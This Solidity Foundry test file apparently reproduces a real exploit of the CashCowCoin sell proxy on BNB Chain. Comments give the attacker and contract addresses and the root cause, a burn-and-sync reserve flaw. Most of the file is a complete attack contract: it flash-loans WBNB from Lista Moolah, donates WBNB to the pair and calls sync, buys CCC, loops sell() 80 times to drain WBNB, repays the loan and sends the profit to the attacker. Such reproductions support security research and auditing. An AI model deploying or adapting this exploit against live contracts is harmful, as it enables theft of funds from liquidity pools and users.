// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$117K (~165.47 WBNB)
// Attacker : 0x7977bdEeE3A79DC85Cc18739692e796b5d2513c4
// Attack Contract : 0x7738b4d7c25e9a7092ae1Ab402343b20340DaeAF
// Vulnerable Contract : 0xF523224c6171f81C54b93F474ed4c78dE91241C7 (CashCow sell proxy)
// Implementation : 0x4287742E50fAd6d3351000fD31632412ab29A9ac (unverified; later upgraded)
// Token / Pair : 0xb9b845f718c32F37e8AF8B887AE4Eec816C93cCC (CCC) / 0x1dBe9458A6840784d5defD62c6B71386100097c0 (CCC/WBNB)
// Attack Tx : https://bscscan.com/tx/0x89d8050641019a5a75fa3dafb4f64fb153e4dd30c0f1f51d06a6cc206d3ead43
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xf523224c6171f81c54b93f474ed4c78de91241c7#code
//
// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2093164984092274886
//
// Root cause: CashCowCoin's public sell() path swaps CCC into the Pancake CCC/WBNB pair
// then burns those CCC out of the pair and calls pair.sync(). Reserves commit a collapsed
// CCC balance while the WBNB has already left, so each subsequent sell drains more WBNB
// against an artificially thin CCC reserve. The live attacker flash-loaned ~416.8k WBNB
// from Lista Moolah, bought CCC via buy(), then looped sell() 80 times.

address constant ATTACKER = 0x7977BDeeE3A79Dc85Cc18739692e796B5D2513C4;
address constant CCC_TOKEN = 0xb9B845F718C32f37E8aF8b887ae4eEc816c93CCC;
address constant SELL_PROXY = 0xF523224c6171f81C54b93F474ed4c78dE91241C7;
address constant CCC_WBNB_PAIR = 0x1DBE9458A6840784d5DEfD62C6b71386100097c0;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant SELL_IMPL = 0x4287742E50fAd6d3351000fD31632412ab29A9ac;
address constant MOOLAH_IMPL = 0x9321587EA0DC8247f8F03E8696C047b2713bB79A;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
uint256 constant FORK_BLOCK = 118_384_060;
uint256 constant FLASH_AMOUNT = 416_831_487_011_304_318_246_517;
uint256 constant DONATE_WBNB = 13_999_890_970_633_457_505_314;
uint256 constant SELL_ROUNDS = 80;

interface ICashCowSell {
    function buy(uint256 amount, uint256 minOut, uint256 deadline) external payable;
    function sell(uint256 amount, uint256 minOut, uint256 deadline) external;
}

interface IMoolahFlash {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
        fundingToken = WBNB_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(CCC_TOKEN, "CCC");
        vm.label(SELL_PROXY, "CashCow sell proxy");
        vm.label(SELL_IMPL, "CashCow sell impl");
        vm.label(CCC_WBNB_PAIR, "CCC/WBNB Pancake pair");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(MOOLAH, "Lista Moolah");
        vm.label(MOOLAH_IMPL, "Moolah impl");
        vm.label(PANCAKE_ROUTER, "Pancake router");

        // Touch proxy implementations so the fork cache records their bytecode.
        require(SELL_IMPL.code.length > 0, "missing sell impl");
        require(MOOLAH_IMPL.code.length > 0, "missing moolah impl");
        require(PANCAKE_ROUTER.code.length > 0, "missing router");
    }

    function testExploit() public balanceLog {
        uint256 before = IERC20(WBNB_TOKEN).balanceOf(ATTACKER);

        CashCowCoinExploit exploit = new CashCowCoinExploit(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(WBNB_TOKEN).balanceOf(ATTACKER) - before;
        emit log_named_decimal_uint("Attacker profit (WBNB)", profit, 18);
        assertGt(profit, 150 ether, "expected >150 WBNB profit");
    }
}

contract CashCowCoinExploit {
    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    receive() external payable {}

    function attack() external {
        require(msg.sender == ATTACKER, "only attacker");
        IMoolahFlash(MOOLAH).flashLoan(WBNB_TOKEN, FLASH_AMOUNT, "");
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MOOLAH, "only moolah");

        // Seed extra WBNB into the pair then sync, matching the live donate.
        IERC20(WBNB_TOKEN).transfer(CCC_WBNB_PAIR, DONATE_WBNB);
        IPancakePair(CCC_WBNB_PAIR).sync();

        // Unwrap remaining WBNB and buy CCC through the CashCow sell proxy.
        uint256 buyWbnb = IERC20(WBNB_TOKEN).balanceOf(address(this));
        IWBNB(payable(WBNB_TOKEN)).withdraw(buyWbnb);
        ICashCowSell(SELL_PROXY).buy{value: buyWbnb}(buyWbnb, 0, block.timestamp);

        // Approve once, then loop sell(). Each call swaps CCC into the pair,
        // burns that CCC back out of the LP, and syncs — draining WBNB.
        uint256 cccBal = IERC20(CCC_TOKEN).balanceOf(address(this));
        IERC20(CCC_TOKEN).approve(SELL_PROXY, type(uint256).max);
        uint256 perSell = cccBal / SELL_ROUNDS;
        for (uint256 i = 0; i < SELL_ROUNDS; i++) {
            uint256 amt = IERC20(CCC_TOKEN).balanceOf(address(this));
            if (i + 1 < SELL_ROUNDS && amt > perSell) {
                amt = perSell;
            }
            if (amt == 0) break;
            ICashCowSell(SELL_PROXY).sell(amt, 0, block.timestamp);
        }

        // Wrap native BNB proceeds, repay the flash loan, forward leftover WBNB.
        uint256 native = address(this).balance;
        if (native > 0) {
            IWBNB(payable(WBNB_TOKEN)).deposit{value: native}();
        }
        IERC20(WBNB_TOKEN).approve(MOOLAH, assets);
        uint256 leftover = IERC20(WBNB_TOKEN).balanceOf(address(this)) - assets;
        if (leftover > 0) {
            IERC20(WBNB_TOKEN).transfer(profitReceiver, leftover);
        }
    }
}
